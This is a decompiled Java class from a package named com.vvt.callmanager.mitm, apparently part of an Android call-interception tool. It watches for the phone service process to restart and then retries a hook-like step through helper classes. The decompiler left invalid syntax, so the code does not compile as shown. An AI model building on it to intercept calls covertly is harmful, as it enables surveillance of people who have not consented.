package com.vvt.callmanager.mitm;

import android.content.Context;
import android.os.ConditionVariable;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import com.vvt.callmanager.ref.g;
import com.vvt.e.a;
import com.vvt.shell.d;
import java.util.HashSet;
import java.util.Iterator;

class j
  extends Thread
{
  private static final boolean a = g.b;
  private ConditionVariable b;
  private TelephonyManager c;
  private String d;
  
  public j(Context paramContext, ConditionVariable paramConditionVariable)
  {
    this.b = paramConditionVariable;
    TelephonyManager localTelephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
    this.c = localTelephonyManager;
  }
  
  private String c()
  {
    boolean bool1 = false;
    Object localObject1 = null;
    Object localObject2 = null;
    while (localObject2 == null)
    {
      localObject1 = com.vvt.shell.j.d("com.android.phone");
      if (localObject1 != null)
      {
        boolean bool2 = ((HashSet)localObject1).isEmpty();
        if (!bool2)
        {
          localObject1 = (d)((HashSet)localObject1).iterator().next();
          String str = ((d)localObject1).b;
          if (str == null) {
            continue;
          }
          str = ((d)localObject1).b.trim();
          int i = str.length();
          if (i <= 0) {
            continue;
          }
          localObject1 = ((d)localObject1).b;
          localObject2 = localObject1;
          continue;
        }
      }
      long l = 500L;
      SystemClock.sleep(l);
    }
    bool1 = a;
    if (bool1) {}
    return (String)localObject2;
  }
  
  private boolean d()
  {
    boolean bool = a.a();
    Object localObject;
    if (bool)
    {
      localObject = new com/vvt/callmanager/mitm/m;
      ((m)localObject).<init>(this, null);
    }
    for (bool = ((m)localObject).a();; bool = ((l)localObject).a())
    {
      return bool;
      localObject = new com/vvt/callmanager/mitm/l;
      ((l)localObject).<init>(this, null);
    }
  }
  
  public void a()
  {
    String str = c();
    this.d = str;
  }
  
  public void run()
  {
    String str1 = this.d;
    if (str1 == null)
    {
      str1 = c();
      this.d = str1;
    }
    boolean bool1 = a;
    if (bool1) {}
    long l;
    do
    {
      l = 500L;
      SystemClock.sleep(l);
      str1 = c();
      boolean bool2 = a;
      if (bool2) {}
      String str2 = this.d;
      bool1 = str2.equals(str1);
    } while (bool1);
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    do
    {
      l = 1500L;
      SystemClock.sleep(l);
      bool1 = d();
    } while (!bool1);
    bool1 = a;
    if (bool1) {}
    this.b.open();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/mitm/j.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */